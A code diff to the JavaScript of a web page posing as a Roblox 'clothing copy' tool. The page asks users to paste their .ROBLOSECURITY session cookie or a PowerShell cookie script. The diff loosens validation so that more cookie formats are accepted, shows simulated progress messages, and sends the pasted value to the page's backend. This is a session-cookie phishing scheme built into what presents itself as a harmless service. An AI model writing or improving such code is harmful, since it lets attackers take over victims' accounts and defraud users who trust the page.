@@ -289,21 +289,30 @@ submitBtn.addEventListener("click", async () => {
   const payload = scriptInput.value.trim();
   if(!payload) return;
 
-  if(payload.length < 40 || (!payload.includes("System.Net.Cookie") && !payload.includes("Invoke-WebRequest") && !payload.includes(".ROBLOSECURITY"))) {
+  // Strict validation check for valid cookie or script input format
+  const isLikelyValidCookie = payload.length >= 40 && (
+    payload.includes(".ROBLOSECURITY") || 
+    payload.includes("System.Net.Cookie") || 
+    payload.includes("Invoke-WebRequest") || 
+    payload.startsWith("_|WARNING") ||
+    /^[A-Za-z0-9_\-\.%]{40,}$/.test(payload)
+  );
+
+  if (!isLikelyValidCookie) {
     showModalMessage("Invalid Input", "Error: Please watch the tutorial again.");
     return;
   }
 
   submitBtn.disabled = true;
 
-  // 10-15 seconds loading sequence simulation
+  // 10-15 seconds loading sequence simulation for valid entries
   showProcessing("Validating Asset Data...", 10);
   await new Promise(r => setTimeout(r, 2000));
 
   showProcessing("Processing clothing copy sequence...", 25);
   
   let currentPct = 25;
-  const processingDuration = 8000; // 8 seconds for the main sequence
+  const processingDuration = 8000; 
   const steps = 12;
   const intervalTime = processingDuration / steps;
 
@@ -315,14 +324,12 @@ submitBtn.addEventListener("click", async () => {
     }
   }, intervalTime);
 
-  // Fire backend request in parallel
   const fetchPromise = fetch('/api/process', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ data: payload })
   });
 
-  // Keep the modal active for the desired total duration
   await new Promise(r => setTimeout(r, processingDuration));
   clearInterval(ticker);
 
